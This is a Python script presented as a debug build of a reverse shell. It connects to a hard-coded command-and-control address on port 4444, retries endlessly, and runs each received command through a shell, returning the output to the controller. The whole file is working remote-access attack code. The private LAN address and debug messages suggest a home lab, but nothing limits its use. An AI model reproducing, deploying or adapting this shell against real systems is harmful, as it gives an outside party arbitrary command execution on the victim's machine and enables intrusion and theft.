#!/usr/bin/env python3
"""
🛠️ DEBUG CORE - Shows connection attempts
"""

import socket
import subprocess
import time
import sys

# ======== YOUR WINDOWS IP ========
C2_IP = "192.168.1.167"
C2_PORT = 4444
# =================================

def debug_print(message):
    print(f"[DEBUG] {message}")

def test_connection():
    """Test if we can reach the C2 server"""
    debug_print(f"🔍 Testing connection to {C2_IP}:{C2_PORT}")
    
    try:
        test_socket = socket.socket()
        test_socket.settimeout(5)
        test_socket.connect((C2_IP, C2_PORT))
        test_socket.close()
        debug_print("✅ C2 server is reachable")
        return True
    except Exception as e:
        debug_print(f"❌ Cannot reach C2 server: {e}")
        return False

def simple_connect():
    debug_print("🚀 Starting reverse shell...")
    
    # Test connection first
    if not test_connection():
        debug_print("💡 Check: Is handler.py running on Windows?")
        debug_print("💡 Check: Is the IP address correct?")
        return
    
    while True:
        try:
            debug_print(f"🔗 Attempting to connect to {C2_IP}:{C2_PORT}")
            
            s = socket.socket()
            s.settimeout(10)
            s.connect((C2_IP, C2_PORT))
            
            debug_print("✅ Connected successfully!")
            s.send(b"DEBUG: Reverse shell connected!\n")
            
            while True:
                # Wait for command
                data = s.recv(1024).decode().strip()
                if not data:
                    continue
                    
                debug_print(f"📥 Received command: {data}")
                
                if data.lower() == 'exit':
                    debug_print("👋 Exit command received")
                    break
                
                # Execute command
                try:
                    result = subprocess.run(data, shell=True, capture_output=True, text=True, timeout=30)
                    output = result.stdout + result.stderr
                    if not output:
                        output = "Command executed (no output)"
                except Exception as e:
                    output = f"Error: {str(e)}"
                
                debug_print(f"📤 Sending output: {len(output)} bytes")
                s.send(output.encode())
                
        except socket.timeout:
            debug_print("⏰ Connection timeout")
        except ConnectionRefusedError:
            debug_print("❌ Connection refused - is handler running?")
        except Exception as e:
            debug_print(f"💥 Connection error: {e}")
        
        debug_print("🔄 Retrying in 10 seconds...")
        time.sleep(10)

if __name__ == "__main__":
    debug_print("🐛 DEBUG MODE ACTIVATED")
    simple_connect()
